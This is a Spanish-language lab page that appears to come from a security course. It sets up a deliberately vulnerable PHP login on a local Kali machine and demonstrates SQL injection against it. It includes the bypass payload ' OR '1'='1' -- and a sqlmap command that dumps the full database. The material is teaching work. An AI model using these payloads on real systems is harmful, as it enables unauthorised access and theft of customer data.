---
sidebar_position: 7
title: "Práctica 4: Vulnerar un login"
---

# Práctica 4 · Vulnerar un login real

En las prácticas anteriores se usó DVWA. En esta se demuestra el ataque sobre una **aplicación con login y un panel privado**, parecida a un sistema real. El objetivo es mostrar algo muy claro para el público: **sin la inyección no se puede entrar al panel, pero con la inyección se entra sin conocer ninguna contraseña**.

La aplicación está hecha a propósito con la vulnerabilidad y corre de forma local en la propia Kali. Son cuatro archivos: `index.php` (login), `panel.php` (panel protegido), `db.php` (base de datos) y `salir.php` (cerrar sesión).

## Preparar la aplicación

Primero, si no se tiene PHP, se instala una sola vez:

```bash
sudo apt install -y php-cli php-sqlite3
```

Se colocan los cuatro archivos en una misma carpeta y se levanta el servidor:

```bash
mkdir -p ~/Desktop/sistema
mv ~/Downloads/index.php ~/Downloads/panel.php ~/Downloads/db.php ~/Downloads/salir.php ~/Desktop/sistema/
cd ~/Desktop/sistema
php -S 0.0.0.0:8080
```

Se deja esa terminal abierta (es el servidor) y se abre en Firefox:

```
http://localhost:8080
```

Los usuarios válidos del sistema son `admin` / `S3cret0_2026` y `bresler` / `kali123`.

## Parte A. El ataque manual (entrar sin contraseña)

1. Para mostrar que el sistema normalmente funciona bien, se entra con `admin` / `S3cret0_2026`: lleva al **panel con los datos de clientes y saldos**.
2. Se cierra sesión y se intenta entrar directo a `http://localhost:8080/panel.php`. El sistema **rebota al login**: no se puede ver el panel sin autenticarse.
3. El ataque: en el campo **Usuario** se escribe lo siguiente, y cualquier cosa en la contraseña:

```
' OR '1'='1' -- 
```

El resultado es que se **entra al panel sin conocer ninguna contraseña**. La condición siempre verdadera engaña al login y el `-- ` anula la revisión de la clave.

## Parte B. El ataque con sqlmap

Dejando el servidor corriendo, en **otra terminal** se lanza sqlmap contra el login:

```bash
sqlmap -u "http://localhost:8080/index.php" --data="usuario=test&clave=test" -p usuario --level 5 --risk 3 --batch --dump
```

sqlmap detecta la vulnerabilidad y **roba la base de datos completa**: la tabla de clientes (nombres, correos y saldos) y la de usuarios con sus contraseñas.

> Este login necesita `--level 5 --risk 3` porque es más realista que DVWA: no muestra los resultados en pantalla, así que sqlmap tiene que trabajar "a ciegas". Con esos valores lo detecta sin problema.

## Por qué esta práctica impacta

Demuestra el **impacto real**: no es solo "sacar datos de una caja de prueba", sino **saltarse el login de un sistema y acceder a información privada** (datos de clientes, saldos). En el módulo **Cómo prevenirlo** está el código corregido de este mismo login, que bloquea los dos ataques.
